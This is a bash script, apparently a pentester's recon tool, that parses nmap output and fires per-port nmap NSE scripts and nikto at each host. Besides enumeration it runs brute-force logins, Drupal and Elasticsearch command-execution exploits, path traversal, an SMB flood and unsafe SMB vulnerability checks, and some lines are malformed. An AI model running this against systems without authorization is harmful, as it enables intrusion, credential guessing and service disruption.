#!/bin/bash

# Constants
APPEND='-append-output'
DISCOVERY_DIR=/root/offsec/discovery
FILENAME=$1
GREP=/bin/grep
NIKTO=/usr/bin/nikto
NMAP=/usr/bin/nmap
SED=/bin/sed
TIMING='-T4'
ZAP=/usr/share/zaproxy/zap.sh

# Meta-variables
COMMON="$APPEND $TIMING"


#counter=0

# Begin function definitions
function ftp {
	# Port 21
	echo -e "\tFTP:\t\t$HOST $PORT"
	#$NMAP -p $PORT $HOST --script=ftp-anon,ftp-brute,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-anon $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-proftpd-backdoor $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-vsftpd-backdoor $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-vuln-cve2010-4221 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-bounce $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=ftp-libopie $COMMON -oA $DISCOVERY_DIR/$HOST
}

function ssh {
	# Port 22
	echo -e "\tSSH:\t\t$HOST $PORT"
	#$NMAP -p $PORT $HOST --script=ssh2-enum-algos,ssh-hostkey,sshv1 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=ssh-hostkey --script-args ssh_hostkey=full $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=ssh-hostkey --script-args ssh_hostkey=all $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=ssh-hostkey --script-args ssh_hostkey='visual bubble' $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=ssh2-enum-algos $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=sshv1 $COMMON -oA $DISCOVERY_DIR/$HOST
}

function smtp {
	# Port 25
	echo -e "\tSMTP:\t\t$HOST $PORT"
	#$NMAP -p $PORT $HOST --script=smtp-commands,smtp-ntlm-info,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 $COMMON -oA $DISCOVERY_DIR/$HOST
	#$NMAP -p $PORT $HOST --script=smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] $COMMON -oA $DISCOVERY_DIR/$HOST
	#$NMAP -p $PORT $HOST --script=smtp-open-relay.nse [--script-args smtp-open-relay.domain=<domain>,smtp-open-relay.ip=<address>,...] $COMMON -oA $DISCOVERY_DIR/$HOST        	
	$NMAP -sV -sC -p $PORT $HOST --script=smtp-commands $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=smtp-brute	$COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] $COMMON -oA $DISCOVERY_DIR/$HOST
}

function http {
	# Port 80
	echo -e "\tHTTP:\t\t$HOST $PORT"
	#$NMAP -p $PORT $HOST --script=http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-enum,http-frontpage-login,http-methods,http-ntlm-info,http-open-proxy,http-passwd,http-php-version,http-robots.txt,http-shellshock,http-trace,http-userdir-enum,http-vuln-cve2006-3392,http-vuln-cve2009-3960,http-vuln-cve2010-2861,http-vuln-cve2012-1823,http-vuln-cve2014-3704,http-vuln-cve2014-8877,http-vuln-cve2015-1635,http-webdav-scan $COMMON -oA $DISCOVERY_DIR/$HOST
	#$NMAP -p $PORT $HOST --script=http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-enum,http-frontpage-login,http-methods,http-ntlm-info,http-open-proxy,http-passwd,http-php-version,http-robots.txt,http-shellshock,http-trace,http-userdir-enum,http-vuln-cve2006-3392,http-vuln-cve2009-3960,http-vuln-cve2010-2861,http-vuln-cve2012-1823,http-vuln-cve2014-3704,http-vuln-cve2014-8877,http-vuln-cve2015-1635,http-webdav-scan $COMMON -oA $DISCOVERY_DIR/$HOST --proxies http://0.0.0.0:8081
	#$NMAP -p $PORT $HOST --script=http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-enum,http-frontpage-login,http-methods,http-ntlm-info,http-open-proxy,http-passwd,http-php-version,http-robots.txt,http-shellshock,http-trace,http-userdir-enum,http-vuln-cve2006-3392,http-vuln-cve2009-3960,http-vuln-cve2010-2861,http-vuln-cve2012-1823,http-vuln-cve2014-3704,http-vuln-cve2014-8877,http-vuln-cve2015-1635,http-webdav-scan $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-adobe-coldfusion-apsa1301 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-apache-server-status $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-aspnet-debug $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-auth [--script-args http-auth.path=/login] $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-auth-finder $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-awstatstotals-exec.nse $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=../../../../../../../etc/issue' $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-cakephp-version $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-coldfusion-subzero $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-comments-displayer.nse $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-default-accounts $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-dombased-xss.nse $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-domino-enum-passwords --script-args http-domino-enum-passwords.username='patrik karlsson',http-domino-enum-passwords.password=secret $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-drupal-enum $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-enum $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-exif-spider $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=script http-fileupload-exploiter.nse $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=script http-form-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-frontpage-login $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-iis-short-name-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-iis-webdav-vuln $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-internal-ip-disclosure $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-joomla-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=script http-passwd --script-args http-passwd.root=/test/ $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-php-version $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-phpmyadmin-dir-traversal $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-rfi-spider $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=script http-shellshock $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-sql-injection $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-userdir-enum $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2006-3392 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2009-3960 --script-args http-http-vuln-cve2009-3960.root="/root/" $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2010-2861 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2011-3368 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2012-1823 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2013-0156 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2013-6786 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2014-8877 $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2015-1427 --script-args command= 'ls' $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-vuln-cve2015-1635.nse $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-wordpress-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -sV -sC -p $PORT $HOST --script=http-wordpress-enum $COMMON -oA $DISCOVERY_DIR/$HOST 
	$NIKTO -host $HOST -port $PORT >> $DISCOVERY_DIR/$HOST-nikto.txt
}

function pop {
	# Port 110
	echo -e "\tPOP:\t\t$HOST $PORT" 
	#$NMAP -p $PORT $HOST --script=pop3-capabilities,pop3-ntlm-info $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=pop3-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=pop3-capabilities $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=pop3-ntlm-info $COMMON -oA $DISCOVERY_DIR/$HOST
}

function rpc-bind {
	# Port 111
	echo -e "\tRPC-BIND:\t$HOST $PORT"
}

function rpc {
	# Port 135
	echo -e "\tRPC:\t\t$HOST $PORT"
	$NMAP -p $PORT $HOST --script=msrpc-enum,rpc-grind,rpcinfo $COMMON -oA $DISCOVERY_DIR/$HOST
}

function netbios {
	# Port 139
	echo -e "\tNetBios:\t$HOST $PORT"
	$NMAP -p $PORT,445 $HOST --script=broadcast-netbios-master-browser $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT,445 $HOST --script=smb-vuln-ms08-067 --script-args=unsafe=1 $COMMON -oA $DISCOVERY_DIR/$HOST
}

function imap {
	# Port 143 or 993
	echo -e "\tIMAP:\t\t$HOST $PORT"
	#$NMAP -p $PORT $HOST --script=imap-capabilities,imap-ntlm-info $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=script imap-brute $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=imap-capabilities $COMMON -oA $DISCOVERY_DIR/$HOST
	$NMAP -p $PORT $HOST --script=imap-ntlm-info $COMMON -oA $DISCOVERY_DIR/$HOST
	
}

function https {
	# Port 443
	http $HOST $PORT
	echo -e "\tHTTPS:\t\t$HOST $PORT"
	$NMAP -p $PORT $HOST --script=ssl-cert,ssl-heartbleed,ssl-poodle,sslv2-drown,sslv2 $COMMON -oA $DISCOVERY_DIR/$HOST
}

function ms-ds {
	# Port 445
	echo -e "\tMS-DS:\t\t$HOST $PORT Not searched"
	$NMAP -p $PORT $HOST --script=smb-brute.nse
	$NMAP -p $PORT $HOST --script=smb-double-pulsar-backdoor
	$NMAP -p $PORT $HOST --script=smb-enum-domains.nse
	$NMAP -p $PORT $HOST --script=smb-enum-users.nse
	$NMAP -p $PORT $HOST --script=smb-enum-processes.nse
	$NMAP -p $PORT $HOST --script=smb-enum-sessions.nse
	$NMAP -p $PORT $HOST --script=smb-enum-shares.nse
	$NMAP -p $PORT $HOST --script=smb-flood.nse
	$NMAP -p $PORT $HOST --script=smb-ls --script-args 'share=c$,path=\temp'
	$NMAP -p $PORT $HOST --script=smb-ls
	$NMAP -p $PORT $HOST --script=smb-mbenum
	$NMAP -p $PORT $HOST --script=smb-os-discovery.nse
	$NMAP -p $PORT $HOST --script=smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>]
	$NMAP -p $PORT $HOST --script=smb-security-mode.nse
	$NMAP -p $PORT $HOST --script=smb-vuln-ms06-025.nse
	$NMAP -p $PORT $HOST --script=smb-vuln-ms07-029.nse
	$NMAP -p $PORT $HOST --script=smb-vuln-ms10-054 --script-args unsafe
	$NMAP -p $PORT $HOST --script=script=smb-vuln-ms10-061
	
	 
}

function imap-ssl {
	# Port 993
	echo -e "\tIMAP-SSL:\t$HOST $PORT"
}

function pop-ssl {
	# Port 995
	echo -e "\tPOP:\t\t$HOST $PORT"
}

function ms-rpc {
	# Port 1025
	echo -e "\tMS-RPC:\t\t$HOST $PORT"
	$NMAP -p $PORT $HOST --script=msrpc-enum,rpc-grind,rpcinfo $COMMON -oA $DISCOVERY_DIR/$HOST
}

function mysql {
	# Port 3306
	echo -e "\tMySQL:\t\t$HOST $PORT"
	$NMAP -p $PORT $HOST --script=mysql-audit,mysql-databases,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $COMMON -oA $DISCOVERY_DIR/$HOST
}

function ms-sql {
	# Port 1433
	echo -e "\tMS-SQL:\t\t$HOST $PORT"
	$NMAP -p $PORT $HOST --
}	

function rdp {
	# Port 3389
	echo -e "\tRDP:\t\t$HOST $PORT"
	$NMAP -p $PORT $HOST --script=rdp-enum-encryption,rdp-vuln-ms12-020 $COMMON -oA $DISCOVERY_DIR/$HOST
}

function odd_port {
	echo "[*] Odd Port: $PORT"
	http $HOST $PORT
	https $HOST $PORT
}


# Start ZAP proxy
#$ZAP -port 8081 -config api.key=12345 -newsession $DISCOVERY_DIR >/dev/null &
#sleep 5

while read -r currentline
do
	counter=$((counter + 1))
	echo $currentline |$GREP "Ports:" >/dev/null
	if [ $? -eq 0 ]
	then
		HOST=`echo $currentline |$SED "s/^Host: \(.*\) ().*/\1/"`
		# Cleanup port list
		temp=`echo $currentline |$SED "s/^.*Ports: \(.*\/\).*$/\1/;"`
		temp=`echo ${temp} |$SED "s/[a-zA-Z]//g;s/^/, /;s/$/,/;"`
		temp=`echo ${temp} |$SED "s/, \([0-9]\{1,5\}\)[^,]*/\1 /g;s/,.*$//;"`
		SERVICES=(${temp})
		NETBIOS=0
		echo -e "[*] $HOST\t\t\t\tServices: ${#SERVICES[@]}"

		for PORT in "${SERVICES[@]}"
		do
			case $PORT in
				21 ) ftp ${HOST} ${PORT} ;;
				22 ) ssh ${HOST} ${PORT} ;;
				25 ) smtp ${HOST} ${PORT} ;;
				80 ) http ${HOST} ${PORT} ;;
				110 ) pop ${HOST} ${PORT} ;;
				111 ) rpc-bind ${HOST} ${PORT} ;;
				135 ) rpc ${HOST} ${PORT} ;;
				139 ) NETBIOS=$((NETBIOS + 1)) ;;
				143 ) imap ${HOST} ${PORT} ;;
				443 ) https ${HOST} ${PORT} ;;
				445 ) NETBIOS=$((NETBIOS + 1)) ;;
				993 ) imap ${HOST} ${PORT} ;;
				995 ) pop ${HOST} ${PORT} ;;
				1025 ) ms-rpc ${HOST} ${PORT} ;;
				3306 ) mysql ${HOST} ${PORT} ;;
				3389 ) rdp ${HOST} ${PORT} ;;
				8000 ) http ${HOST} ${PORT} ;;
				* ) odd_port ${HOST} ${PORT} ;;
			esac
		done
		if [ $NETBIOS -ne "0" ]
		then
			netbios ${HOST} 139
		fi
		echo -e "\n****************************************\n"
	fi
done < $FILENAME	
